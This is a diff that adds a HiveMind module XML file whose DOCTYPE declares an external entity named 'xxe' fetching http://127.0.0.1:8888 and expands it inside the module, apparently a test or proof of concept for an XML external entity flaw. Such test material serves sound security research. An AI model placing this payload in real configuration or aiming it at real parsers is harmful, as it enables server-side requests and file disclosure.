@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE foo [
+        <!ENTITY xxe SYSTEM "http://127.0.0.1:8888" >]>
+<module id="myModule" version="1.0.0">
+    &xxe;
+    <service-point id="Print" interface="javax.sql.DataSource">
+        <invoke-factory>
+            <construct class="com.mechoy.hivemind.MyCustomPrint"/>
+        </invoke-factory>
+    </service-point>
+</module>
